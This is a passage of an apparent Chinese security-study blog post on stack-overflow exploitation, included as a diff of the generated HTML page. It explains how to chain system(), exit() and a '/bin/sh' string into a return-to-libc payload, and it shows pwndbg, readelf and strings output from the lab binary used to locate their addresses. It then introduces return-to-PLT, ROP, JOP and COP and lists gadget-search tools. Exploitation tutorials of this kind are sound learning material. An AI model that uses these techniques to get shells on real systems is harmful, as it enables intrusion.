+<td align="center">“/bin/sh”</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">exit</td>
+</tr>
+<tr>
+<td align="center">return addr</td>
+<td align="center">system</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">padding</td>
+</tr>
+</tbody></table>
+<p>system返回时，栈上对应的返回地址为exit()函数，进而执行exit(0)，所以相当于执行了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>简单来说就是：</p>
+<ul>
+<li>获得system()和exit()的函数地址</li>
+<li>获得”/bin/sh”字符串地址</li>
+<li>构造溢出载荷<ul>
+<li>system + exit + “bin/sh” + 0</li>
+</ul>
+</li>
+<li>实验在关闭ASLR情况下进行，libc函数地址固定不变</li>
+</ul>
+<h4 id="获得system-和exit-的函数地址"><a href="#获得system-和exit-的函数地址" class="headerlink" title="获得system()和exit()的函数地址"></a>获得system()和exit()的函数地址</h4><ul>
+<li>可以在GDB中直接使用print命令查看</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> print system</span><br><span class="line"><span class="meta">$</span>1 = &#123;int (const char *)&#125; 0xf7e19200 &lt;__libc_system&gt;</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p exit</span><br><span class="line"><span class="meta">$</span>2 = &#123;void (int)&#125; 0xf7e0c3d0 &lt;__GI_exit&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="获得”-bin-sh”字符串地址"><a href="#获得”-bin-sh”字符串地址" class="headerlink" title="获得”/bin/sh”字符串地址"></a>获得”/bin/sh”字符串地址</h4><p>glibc中必定有字符串”/bin/sh”，可以使用GDB中的find命令，在libc的内存范围内搜索</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">0x56555000 0x56556000 r-xp     1000 0      /home/syc/Desktop/test/bof</span><br><span class="line">0x56556000 0x56557000 r-xp     1000 0      /home/syc/Desktop/test/bof</span><br><span class="line">0x56557000 0x56558000 rwxp     1000 1000   /home/syc/Desktop/test/bof</span><br><span class="line">0xf7ddc000 0xf7fb1000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb1000 0xf7fb2000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb2000 0xf7fb4000 r-xp     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 rwxp     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb5000 0xf7fb8000 rwxp     3000 0      </span><br><span class="line">0xf7fd0000 0xf7fd2000 rwxp     2000 0      </span><br><span class="line">0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd6000 0xf7ffc000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 25000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 26000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br><span class="line"><span class="meta">pwndbg&gt;</span> find /b 0xf7ddc000, 0xf7fb5000,'/','b','i','n','/','s','h',0</span><br><span class="line">0xf7f5a0cf</span><br><span class="line">1 pattern found.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/s 0xf7f5a0cf</span><br><span class="line">0xf7f5a0cf:	"/bin/sh"</span><br></pre></td></tr></table></figure>
+
+<p>0xf7ddc000是libc起始地址，0xf7fb5000是结尾地址</p>
+<h4 id="获取地址的另一种方法"><a href="#获取地址的另一种方法" class="headerlink" title="获取地址的另一种方法"></a>获取地址的另一种方法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/test$ ldd bof</span><br><span class="line">	linux-gate.so.1 (0xf7eff000)</span><br><span class="line">	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d03000)</span><br><span class="line">	/lib/ld-linux.so.2 (0xf7f00000)</span><br><span class="line">syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system</span><br><span class="line">   ...</span><br><span class="line">  1510: 0003d200    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</span><br><span class="line">syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit</span><br><span class="line">   ...</span><br><span class="line">   147: 000303d0    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0</span><br><span class="line">   ...</span><br><span class="line">syc@ubuntu:~/Desktop/test$ strings -tx  /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</span><br><span class="line"> 17e0cf /bin/sh</span><br><span class="line"> syc@ubuntu:~/Desktop/test$ gdb -q</span><br><span class="line">pwndbg: loaded 179 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x 0xf7d03000 + 0x0003d200</span><br><span class="line"><span class="meta">$</span>1 = 0xf7d40200</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x 0xf7d03000 + 0x000303d0</span><br><span class="line"><span class="meta">$</span>2 = 0xf7d333d0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x 0xf7d03000 + 0x017e0cf</span><br><span class="line"><span class="meta">$</span>3 = 0xf7e810cf</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>首先用ldd命令获取libc基址</li>
+<li>然后用readelf命令找到system和exit函数在libc中的偏移</li>
+<li>用strings命令找到字符串/bin/sh在libc中的偏移</li>
+<li>最后通过与libc基址相加来获得最终地址</li>
+</ul>
+<p>有时候我们会发现”/bin/sh”的地址中包含换行符0a，argv[1]会被换行符截断，解决方案：使用”sh\0”</p>
+<p>可以更换一个命令字符串，一般来说PATH环境变量中已经包含/bin目录，因此只需要找到一个”sh”字符串，将其地址作为system()函数的参数即可。</p>
+<p>我们在程序自身空间内就可以找到”sh”这个字符串，同样使用find命令。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> find /b 0xf7ddc000, 0xf7fb5000, 's','h',0</span><br><span class="line">0xf7deacd3</span><br><span class="line">0xf7dead32</span><br><span class="line">0xf7debe59</span><br><span class="line">0xf7dec4ac</span><br><span class="line">0xf7dee4f6</span><br><span class="line">0xf7dee5d3</span><br><span class="line">0xf7deee85</span><br><span class="line">0xf7def172</span><br><span class="line">0xf7f573b5 &lt;__re_error_msgid+117&gt;</span><br><span class="line">0xf7f57dc1 &lt;afs.8574+193&gt;</span><br><span class="line">0xf7f5a0d4</span><br><span class="line">0xf7f5bacd</span><br><span class="line">12 patterns found.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/s 0xf7deacd3</span><br><span class="line">0xf7deacd3:	"sh"</span><br></pre></td></tr></table></figure>
+
+<h2 id="Return-to-PLT"><a href="#Return-to-PLT" class="headerlink" title="Return to PLT"></a>Return to PLT</h2><ul>
+<li>如果动态共享库的地址随机化保护开启，则无法知道libc地址</li>
+<li>而程序中已经引用的动态库函数，可以直接通过PLT调用，无需知道实际地址</li>
+</ul>
+<h2 id="重新思考Return-to-Libc"><a href="#重新思考Return-to-Libc" class="headerlink" title="重新思考Return to Libc"></a>重新思考Return to Libc</h2><ul>
+<li>利用Return to Libc，我们调用了system(“/bin/sh”)和exit(0)</li>
+<li>system()和exit()函数本质上都是以ret指令结尾的代码片段</li>
+<li>那如果其他ret结尾的代码片段呢？例如几条指令组成的小代码片段。同样可行！</li>
+</ul>
+<h2 id="ROP（Return-Oriented-Programming）"><a href="#ROP（Return-Oriented-Programming）" class="headerlink" title="ROP（Return Oriented Programming）"></a>ROP（Return Oriented Programming）</h2><ul>
+<li>通过拼接以ret指令结尾的代码片段来实现某些功能的技术，称为ROP</li>
+<li>以ret指令结尾的小段代码片段我们称为ROP gadget：例如：pop edx;ret</li>
+<li>为实现某-功能拼接而成的多个ROP gadget,我们称为ROP链(ROP Chain）</li>
+<li>在栈上(从返回地址开始)填充的用于执行ROP链的数据，我们称为ROP载荷(ROP Payload)</li>
+<li>ROP技术是Return to libc的扩 展，Return to libc是ROP的一 种特殊情况，即ROP gadget恰好是libc函数的情形</li>
+</ul>
+<h2 id="ROP的扩展-JOP、COP"><a href="#ROP的扩展-JOP、COP" class="headerlink" title="ROP的扩展-JOP、COP"></a>ROP的扩展-JOP、COP</h2><ul>
+<li>换汤不换药，把使用的的代码片段从ret结尾拓展到jmp/call结尾</li>
+<li>JOP（Jump Oriented Programming）<ul>
+<li>pop esi ; jmp dword [esi-0x70]</li>
+</ul>
+</li>
+<li>COP（Call Oriented Programming）<ul>
+<li>mov edx,dowrd [esp+0x48] ; call doword [eax+0x10]</li>
+</ul>
+</li>
+</ul>
+<h2 id="ROP-Gadget-搜索工具"><a href="#ROP-Gadget-搜索工具" class="headerlink" title="ROP Gadget 搜索工具"></a>ROP Gadget 搜索工具</h2><ul>
+<li>ROPGadget<ul>
+<li><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a></li>
+</ul>
+</li>
+<li>rp<ul>
+<li><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></li>
+</ul>
+</li>
+<li>ropper<ul>
+<li><a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">https://github.com/sashs/Ropper</a></li>
+</ul>
+</li>
+<li>xrop<ul>
+<li><a href="https://github.com/acama/xrop" target="_blank" rel="noopener">https://github.com/acama/xrop</a></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/04/21/Linux╚├╓╒╢╦╫▀┤·└φ╡─╝╕╓╓╖╜╖¿/" rel="next" title="Linux让终端走代理的几种方法">
+                  <i class="fa fa-chevron-left"></i> Linux让终端走代理的几种方法
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/04/26/│ñ═ñPWN▒╩╝╟02/" rel="prev" title="长亭PWN笔记02">
+                  长亭PWN笔记02 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN工具集合"><span class="nav-number">1.</span> <span class="nav-text">PWN工具集合</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用栈溢出"><span class="nav-number">2.</span> <span class="nav-text">利用栈溢出</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Example-BOE-program："><span class="nav-number">2.1.</span> <span class="nav-text">Example BOE program：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析："><span class="nav-number">2.2.</span> <span class="nav-text">分析：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode"><span class="nav-number">3.</span> <span class="nav-text">shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手写"><span class="nav-number">3.1.</span> <span class="nav-text">手写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试"><span class="nav-number">3.2.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提取"><span class="nav-number">3.3.</span> <span class="nav-text">提取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#栈溢出漏洞利用步骤"><span class="nav-number">4.</span> <span class="nav-text">栈溢出漏洞利用步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#寻找填充长度"><span class="nav-number">5.</span> <span class="nav-text">寻找填充长度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手动寻找"><span class="nav-number">5.1.</span> <span class="nav-text">手动寻找</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools之cyclic"><span class="nav-number">5.2.</span> <span class="nav-text">pwntools之cyclic</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Return-to-Libc"><span class="nav-number">6.</span> <span class="nav-text">Return to Libc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#简单的一个函数"><span class="nav-number">6.1.</span> <span class="nav-text">简单的一个函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获得system-和exit-的函数地址"><span class="nav-number">6.1.1.</span> <span class="nav-text">获得system()和exit()的函数地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获得”-bin-sh”字符串地址"><span class="nav-number">6.1.2.</span> <span class="nav-text">获得”/bin/sh”字符串地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取地址的另一种方法"><span class="nav-number">6.1.3.</span> <span class="nav-text">获取地址的另一种方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Return-to-PLT"><span class="nav-number">7.</span> <span class="nav-text">Return to PLT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#重新思考Return-to-Libc"><span class="nav-number">8.</span> <span class="nav-text">重新思考Return to Libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP（Return-Oriented-Programming）"><span class="nav-number">9.</span> <span class="nav-text">ROP（Return Oriented Programming）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP的扩展-JOP、COP"><span class="nav-number">10.</span> <span class="nav-text">ROP的扩展-JOP、COP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP-Gadget-搜索工具"><span class="nav-number">11.</span> <span class="nav-text">ROP Gadget 搜索工具</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
